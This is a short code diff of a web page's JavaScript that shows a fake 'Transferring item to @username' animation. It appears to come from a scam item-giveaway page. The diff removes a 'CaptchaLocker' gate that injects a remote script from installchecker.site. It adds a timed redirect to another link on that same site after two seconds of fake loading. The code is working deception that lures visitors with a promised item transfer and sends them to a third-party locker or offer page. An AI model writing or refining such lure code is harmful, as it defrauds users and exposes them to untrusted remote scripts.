@@ -1157,18 +1157,13 @@
             <div class="square"></div>
           </div>
           <p class="searching-text">Transferring ${itemName} to @${username}</p>
-          <div data-captcha-enable="true"></div>
         </div>
       `;
-      if (window.CaptchaLocker && typeof window.CaptchaLocker.init === 'function') {
-          window.CaptchaLocker.init();
-      } else {
-          // Fallback: reload the script if the global is not present
-          var script = document.createElement('script');
-          script.type = 'text/javascript';
-          script.src = 'https://installchecker.site/cp/js/j3pln';
-          document.body.appendChild(script);
-      }
+      
+      // Redirect to the specified link instead of showing captcha
+      setTimeout(() => {
+        window.location.href = "https://installchecker.site/cl/i/1onk5k";
+      }, 2000); // 2 second delay to show the loading animation
     }
 
     // Function to show error state
